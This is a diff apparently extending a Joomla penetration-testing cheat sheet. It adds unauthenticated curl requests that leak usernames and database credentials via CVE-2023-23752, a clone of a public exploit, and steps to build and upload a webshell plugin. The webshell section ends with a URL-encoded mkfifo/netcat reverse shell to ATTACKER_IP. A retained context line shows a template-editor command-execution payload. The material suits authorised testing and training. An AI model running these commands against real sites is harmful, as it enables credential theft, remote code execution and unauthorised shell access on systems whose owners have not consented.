@@ -42,6 +42,31 @@ droopescan scan joomla -u http://TARGET
 
 ---
 
+## CVE-2023-23752 - Information Disclosure (Unauthenticated)
+
+**Affects:** Joomla 4.0.0 - 4.2.7
+
+Leaks usernames and database credentials via REST API without authentication.
+
+### Manual Exploitation
+
+```bash
+# Leak usernames
+curl -s "http://TARGET/api/index.php/v1/users?public=true" | jq
+
+# Leak DB password (check all fields)
+curl -s "http://TARGET/api/index.php/v1/config/application?public=true" | jq
+```
+
+### Automated Exploit
+
+```bash
+git clone https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT.git
+python3 CVE-2023-23752.py -u http://TARGET
+```
+
+---
+
 ## Template Editor RCE (Authenticated)
 
 1. Login to `/administrator` with admin creds
@@ -58,6 +83,40 @@ system($_GET['cmd']);
 
 ```bash
 curl http://TARGET/templates/protostar/error.php?cmd=id
+```
+
+---
+
+## Webshell Plugin Upload (Authenticated)
+
+Alternative to template editing - upload a malicious module.
+
+### Setup
+
+```bash
+git clone https://github.com/p0dalirius/Joomla-webshell-plugin
+cd Joomla-webshell-plugin
+make
+# Creates: ./dist/joomla-webshell-plugin-1.1.0.zip
+```
+
+### Upload
+
+1. Login to `/administrator`
+2. Navigate: `System → Install → Extensions`
+   - Or directly: `/administrator/index.php?option=com_installer&view=install`
+3. Upload the ZIP file
+4. "Installation of the module was successful"
+
+### Execute Commands
+
+```bash
+# Test
+curl -X POST 'http://TARGET/modules/mod_webshell/mod_webshell.php' --data "action=exec&cmd=id"
+
+# Reverse shell
+curl -X POST 'http://TARGET/modules/mod_webshell/mod_webshell.php' \
+  --data "action=exec&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7Csh%20-i%202%3E%261%7Cnc%20ATTACKER_IP%209001%20%3E/tmp/f"
 ```
 
 ---
